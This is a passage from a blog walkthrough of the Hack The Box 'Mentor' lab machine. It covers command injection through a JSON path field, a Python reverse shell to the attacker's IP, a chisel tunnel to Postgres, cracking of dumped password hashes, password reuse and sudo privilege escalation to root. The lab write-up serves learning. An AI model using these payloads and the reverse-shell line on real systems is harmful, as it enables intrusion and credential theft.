+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+</span></span><span class=line><span class=cl>Content-Length: 30
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>&#34;path&#34;:   &#34;/etc/passwd&#34;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Date: Sun, 19 Feb 2023 07:22:30 GMT
+</span></span><span class=line><span class=cl>Server: uvicorn
+</span></span><span class=line><span class=cl>content-length: 16
+</span></span><span class=line><span class=cl>content-type: application/json
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>{&#34;INFO&#34;:&#34;Done!&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>So maybe this file is backed up somewhere we can access? Or perhaps we can command inject?</p><p>I tried different variations off blind command injection using <code>sleep</code> , and sure enough - the server hung for around 10 seconds with the below payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;path&#34;</span><span class=p>:</span> <span class=s2>&#34;/etc/passwd;sleep 10;&#34;</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So it looks like our app shells out to read and back up the file somewhere, and a simple semi-colon <code>;</code> allows us to inject/append other arbitrary shell commands.</p><p>I had issues with bash (minimal docker container with only <code>sh</code> or <code>ash</code> &ndash; possibly alpine?), so I basically created a <code>sh</code> reverse shell by using python within our command injected path in the JSON payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=nt>&#34;path&#34;</span><span class=p>:</span> <span class=s2>&#34;/etc/passwd;python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((\&#34;10.10.14.33\&#34;,3322));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&#34;sh\&#34;)&#39;&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>And looking back at our listening netcat instance we get a reverse shell, from which we can read the user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.193 <span class=m>40504</span>
+</span></span><span class=line><span class=cl>/app <span class=c1># ls /home        </span>
+</span></span><span class=line><span class=cl>ls /home
+</span></span><span class=line><span class=cl>svc
+</span></span><span class=line><span class=cl>/app <span class=c1># ls /home/svc</span>
+</span></span><span class=line><span class=cl>ls /home/svc
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>/app <span class=c1># cat /home/svc/user.txt</span>
+</span></span><span class=line><span class=cl>cat /home/svc/user.txt
+</span></span><span class=line><span class=cl>aa7da69a22677e9f78e4cfcc8d213108
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>As suspected above, it looks like we&rsquo;re in a docker container, based on the limited environment, and the <code>/app</code> volume/working directory containing the application&rsquo;s Dockerfile:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/app <span class=c1># ls -la </span>
+</span></span><span class=line><span class=cl>ls -la
+</span></span><span class=line><span class=cl>total <span class=m>24</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        root          <span class=m>4096</span> Nov <span class=m>10</span> 16:00 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        root          <span class=m>4096</span> Feb <span class=m>19</span> 05:32 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        root          <span class=m>1024</span> Jun <span class=m>12</span>  <span class=m>2022</span> .Dockerfile.swp
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        root           <span class=m>522</span> Nov  <span class=m>3</span> 12:58 Dockerfile
+</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>1</span> <span class=m>0</span>        root          <span class=m>4096</span> Nov <span class=m>10</span> 16:00 app
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> <span class=m>0</span>        root           <span class=m>672</span> Jun  <span class=m>4</span>  <span class=m>2022</span> requirements.txt
+</span></span><span class=line><span class=cl><span class=nv>PYTHON_GET_PIP_SHA256</span><span class=o>=</span>b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee
+</span></span><span class=line><span class=cl>/app <span class=c1># cat Dockerfile </span>
+</span></span><span class=line><span class=cl>FROM python:3.6.9-alpine
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>WORKDIR /app
+</span></span><span class=line><span class=cl>ENV HOME /home/svc
+</span></span><span class=line><span class=cl>ENV PATH /home/svc/.local/bin:<span class=si>${</span><span class=nv>PATH</span><span class=si>}</span>
+</span></span><span class=line><span class=cl>RUN python -m pip install --upgrade pip --user svc
+</span></span><span class=line><span class=cl>COPY requirements.txt requirements.txt
+</span></span><span class=line><span class=cl>RUN pip install -r requirements.txt
+</span></span><span class=line><span class=cl>RUN pip install pydantic<span class=o>[</span>email<span class=o>]</span> pyjwt
+</span></span><span class=line><span class=cl>EXPOSE <span class=m>8000</span>
+</span></span><span class=line><span class=cl>COPY . .
+</span></span><span class=line><span class=cl>CMD <span class=o>[</span><span class=s2>&#34;python3&#34;</span>, <span class=s2>&#34;-m&#34;</span>, <span class=s2>&#34;uvicorn&#34;</span>, <span class=s2>&#34;app.main:app&#34;</span>, <span class=s2>&#34;--reload&#34;</span>, <span class=s2>&#34;--workers&#34;</span>, <span class=s2>&#34;100&#34;</span>, <span class=s2>&#34;--host&#34;</span>, <span class=s2>&#34;0.0.0.0&#34;</span>, <span class=s2>&#34;--port&#34;</span> ,<span class=s2>&#34;8000&#34;</span><span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Poking around the app&rsquo;s python files, we see a default/fallback connection string which is used in the absence of <code>DATABASE_URL</code> in the environment:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/app/app <span class=c1># cat db.py</span>
+</span></span><span class=line><span class=cl>.. snip ..
+</span></span><span class=line><span class=cl><span class=c1># Database url if none is passed the default one is used</span>
+</span></span><span class=line><span class=cl><span class=nv>DATABASE_URL</span> <span class=o>=</span> os.getenv<span class=o>(</span><span class=s2>&#34;DATABASE_URL&#34;</span>, <span class=s2>&#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&#34;</span><span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s where I did a very quick crash course on tunnelling, to see if I could somehow tunnel the postgres connection above through to my own machine.. We have a minimal docker container with no <code>psql</code>, so connecting to the postgres instance with the credentials in the connection string above is not easy without first tunnelling the connection through our own machine.</p><p>I found <a href=https://github.com/jpillora/chisel/ target=_blank rel="noopener noreffer">chisel</a>, a go-based app that allows you to tunnel TCP connections over HTTP.</p><p>0xdf&rsquo;s quick chisel cheatsheet here was quite useful:<a href=https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html target=_blank rel="noopener noreffer">Tunneling with Chisel and SSF | 0xdf hacks stuff</a></p><p>I ran <code>python -m 'http.server' 8888</code> on my machine, and <code>wget http://10.10.14.33:8888/chisel</code> to download the chisel binary into the container.</p><p>I now run a <code>chisel</code> server on my Parrot VM, listening on port 6969:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./chisel server -p <span class=m>6969</span> --reverse
+</span></span><span class=line><span class=cl>2023/02/19 20:57:04 server: Reverse tunnelling enabled
+</span></span><span class=line><span class=cl>2023/02/19 20:57:04 server: Fingerprint 6Zclibd5UaElkkiDQ/SX1oGWqKStwyRE0MJrh6y+ss4<span class=o>=</span>
+</span></span><span class=line><span class=cl>2023/02/19 20:57:04 server: Listening on http://0.0.0.0:6969
+</span></span></code></pre></td></tr></table></div></div><p>Now, back in the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/app <span class=c1># ./chisel client 10.10.14.33:6969 R:5555:172.22.0.1:5432</span>
+</span></span></code></pre></td></tr></table></div></div><p>This will connect chisel as a client back to my Parrot VM on 10.10.14.33:6969 via a HTTP connection. In a more locked down environment, you would likely select more common ports, such as 80, 443, 8080, etc (why is a container communicating out to the interwebs on port 6969?)</p><p>With this outbound connection from the container to my own machine in place, the <code>R:5555:172.22.0.1:5432</code> syntax above basically will set a <em>remote</em> listening port on 5555 on my Parrot VM, which tunnels/forwards from my machine <strong>back</strong> through to 172.22.0.1:5432 on the target (container), which is the postgres instance our container&rsquo;s running application connects to.</p><p>So now my Parrot VM will be listening on port 5555, tunnelled back through the outbound HTTP connection our container established via the <code>chisel client</code> command we ran inside the container, and finally to the postgres instance. Let&rsquo;s try connecting &ndash; so from our Parrot VM, we run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$psql</span> postgres://postgres:postgres@localhost:5555/mentorquotes_db
+</span></span><span class=line><span class=cl>psql <span class=o>(</span>13.9 <span class=o>(</span>Debian 13.9-0+deb11u1<span class=o>)</span>, server 13.7 <span class=o>(</span>Debian 13.7-1.pgdg110+1<span class=o>))</span>
+</span></span><span class=line><span class=cl>Type <span class=s2>&#34;help&#34;</span> <span class=k>for</span> help.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>mentorquotes_db</span><span class=o>=</span><span class=c1># \dt</span>
+</span></span><span class=line><span class=cl>          List of relations
+</span></span><span class=line><span class=cl> Schema <span class=p>|</span>   Name   <span class=p>|</span> Type  <span class=p>|</span>  Owner   
+</span></span><span class=line><span class=cl>--------+----------+-------+----------
+</span></span><span class=line><span class=cl> public <span class=p>|</span> cmd_exec <span class=p>|</span> table <span class=p>|</span> postgres
+</span></span><span class=line><span class=cl> public <span class=p>|</span> quotes   <span class=p>|</span> table <span class=p>|</span> postgres
+</span></span><span class=line><span class=cl> public <span class=p>|</span> users    <span class=p>|</span> table <span class=p>|</span> postgres
+</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>3</span> rows<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>mentorquotes_db</span><span class=o>=</span><span class=c1># select * from users;</span>
+</span></span><span class=line><span class=cl> id <span class=p>|</span>           email            <span class=p>|</span>  username   <span class=p>|</span>             password             
+</span></span><span class=line><span class=cl>----+----------------------------+-------------+----------------------------------
+</span></span><span class=line><span class=cl>  <span class=m>1</span> <span class=p>|</span> james@mentorquotes.htb     <span class=p>|</span> james       <span class=p>|</span> 7ccdcd8c05b59add9c198d492b36a503
+</span></span><span class=line><span class=cl>  <span class=m>2</span> <span class=p>|</span> svc@mentorquotes.htb       <span class=p>|</span> service_acc <span class=p>|</span> 53f22d0dfa10dce7e29cd31f4f953fd8
+</span></span><span class=line><span class=cl>  <span class=m>4</span> <span class=p>|</span> foo@bar.com                <span class=p>|</span> foobar      <span class=p>|</span> 6df23dc03f9b54cc38a0fc1483df6e21
+</span></span><span class=line><span class=cl>  <span class=m>5</span> <span class=p>|</span> james@foo.bar              <span class=p>|</span> james       <span class=p>|</span> 6df23dc03f9b54cc38a0fc1483df6e21
+</span></span><span class=line><span class=cl>  <span class=m>6</span> <span class=p>|</span> admin@mentorquotes.htb     <span class=p>|</span> admin       <span class=p>|</span> 6df23dc03f9b54cc38a0fc1483df6e21
+</span></span></code></pre></td></tr></table></div></div><p>A little poking around, and we now have password hashes for existing accounts including our own. After running the <code>service_acc</code> account&rsquo;s hash through hashcat, we find password <code>123meunomeeivani</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$hashcat</span> 53f22d0dfa10dce7e29cd31f4f953fd8 /usr/share/wordlists/rockyou.txt --show 
+</span></span><span class=line><span class=cl>53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
+</span></span></code></pre></td></tr></table></div></div><p>And we&rsquo;re able to SSH in as <code>svc@mentorquotes.htb</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sshpass</span> -p 123meunomeeivani ssh svc@mentorquotes.htb
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 22.04.1 LTS <span class=o>(</span>GNU/Linux 5.15.0-56-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System information as of Sun Feb <span class=m>19</span> 10:21:25 AM UTC <span class=m>2023</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  System load:                      0.2568359375
+</span></span><span class=line><span class=cl>  Usage of /:                       65.2% of 8.09GB
+</span></span><span class=line><span class=cl>  Memory usage:                     19%
+</span></span><span class=line><span class=cl>  Swap usage:                       0%
+</span></span><span class=line><span class=cl>  Processes:                        <span class=m>490</span>
+</span></span><span class=line><span class=cl>  Users logged in:                  <span class=m>0</span>
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-028c7a43f929: 172.20.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-24ddaa1f3b47: 172.19.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-3d63c18e314d: 172.21.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-7d5c72654da7: 172.22.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-a8a89c3bf6ff: 172.18.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> docker0:         172.17.0.1
+</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> eth0:            10.10.11.193
+</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> eth0:            dead:beef::250:56ff:feb9:14cc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt; There are <span class=m>237</span> zombie processes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
+</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
+</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Sun Feb <span class=m>19</span> 10:20:23 <span class=m>2023</span> from 10.10.14.33
+</span></span><span class=line><span class=cl>svc@mentor:~$ cat user.txt 
+</span></span><span class=line><span class=cl>aa7da69a22677e9f78e4cfcc8d213108
+</span></span></code></pre></td></tr></table></div></div><p>So we have the same user flag which is bind mounted into the container the web application runs in &ndash; which is not terribly exciting. But at least we&rsquo;ve escaped out of lightweight container hell and can at least look at privesc to root on the host.</p><p>The active users on the machine are as follows, which we obtain by grepping <code>/etc/passwd</code> and filtering out invalid login shells:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@mentor:/dev/shm$ grep -vE <span class=s1>&#39;/usr/sbin/nologin|/bin/false&#39;</span> /etc/passwd
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>svc❌1001:1001:,,,:/home/svc:/bin/bash
+</span></span><span class=line><span class=cl>james❌1000:1000:,,,:/home/james:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>Ideally we want root &ndash; but maybe we can privesc via the james user? I ran <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS target=_blank rel="noopener noreffer">LinPEAS</a> but didn&rsquo;t see much that stood out.</p><p>I floundered a little with some more enumeration, and decided to start grepping the filesystem for sensitive things. Next I grepped the filesystem for &lsquo;pass&rsquo;:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@mentor:/dev/shm$ grep -irn pass /etc 2&gt; /dev/null
+</span></span><span class=line><span class=cl>/etc/snmp/snmpd.conf:78:# createUser username <span class=o>(</span>MD5<span class=p>|</span>SHA<span class=p>|</span>SHA-512<span class=p>|</span>SHA-384<span class=p>|</span>SHA-256<span class=p>|</span>SHA-224<span class=o>)</span> authpassphrase <span class=o>[</span>DES<span class=p>|</span>AES<span class=o>]</span> <span class=o>[</span>privpassphrase<span class=o>]</span>
+</span></span><span class=line><span class=cl>/etc/snmp/snmpd.conf:92:createUser bootstrap MD5 SuperSecurePassword123__ DES
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try <code>su</code> as james with the password <code>SuperSecurePassword123__</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>svc@mentor:/dev/shm$ su james
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl>james@mentor:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> james on mentor:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin, use_pty
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User james may run the following commands on mentor:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> /bin/sh
+</span></span><span class=line><span class=cl>james@mentor:~$ sudo /bin/sh
+</span></span><span class=line><span class=cl><span class=c1># ls /root</span>
+</span></span><span class=line><span class=cl>logins.log  root.txt  scripts  snap
+</span></span><span class=line><span class=cl><span class=c1># cat /root/root.txt</span>
+</span></span><span class=line><span class=cl>1f508ff3a36988138861bde0e30f4c0f
+</span></span></code></pre></td></tr></table></div></div><p>So we were able to <code>su</code> as james, and as <code>sudo -l</code> shows, this account can run <code>/bin/sh</code> as root.</p><p>And that&rsquo;s it &ndash; we have the root flag!</p><h2 id=conclusion>Conclusion</h2><p>This machine was a little bit of an oddball: SNMP and a flaky web server that I was unable to enumerate initially both resulted in a substantial amount of time lost.</p><p>I&rsquo;ve used SNMP within both my home lab and working for an MSP before (configuring remote management software), but did not expect to have issues enumerating community strings until I found one tool that worked with SNMPv2.</p><p>Apart from these two hiccups, the only other challenge was tunnelling the postgres connection &ndash; and 0xdf&rsquo;s quick cheatsheet was very useful here. Another more tedious option would be to write a custom python script to run from within the container, connecting to the Postgres instance and dumping tables.</p><p>Otherwise, the machine was fairly straight forward mostly requiring enumerating APIs trying to get an admin JWT in order to further enumerate authorized APIs followed by basic command injection into a backup endpoint that was easily testable before being used to gain a reverse shell.</p><p>I&rsquo;m looking forward to more challenges where tunnelling, pivoting, etc are involved across a larger lab simulating a proper network &ndash; and interested to see what other tooling exists in this area.</p><p>What did I learn here? Well, different versions of SNMP will enumerate differently on the same device &ndash; given different community strings. Also, sometimes machines are just unreliable, which is easily forgiven. After gaining a foothold and seeing evidence of other people&rsquo;s reverse shells, scripts, etc &ndash; you begin to realise how much traffic these VMs are taking which affects how (un-)responsive they are.</p><p>The main take away? Regular breaks, and revisit challenges with fresh eyes. Often time heals &ndash; both physiologically (sleep!) and a reboot will restore services. It can be difficult knowing whether you&rsquo;re not enumerating fully, or if a machine&rsquo;s services are just unresponsive.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-03-11&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/b0d38f84f396e0ba5310241b6d9a98245746a881 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) b0d38f84f396e0ba5310241b6d9a98245746a881: Add mentor htb walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>b0d38f8</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-03-11-mentor/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-03-11-mentor/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-03-11-mentor/ data-title="Mentor HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-03-11-mentor/ data-title="Mentor HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-03-11-mentor/ data-title="Mentor HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/snmp/>snmp</a>,&nbsp;<a href=/tags/docker/>docker</a>,&nbsp;<a href=/tags/python/>python</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-02-25-awkward-htb/ class=prev rel=prev title="Awkward HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Awkward HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
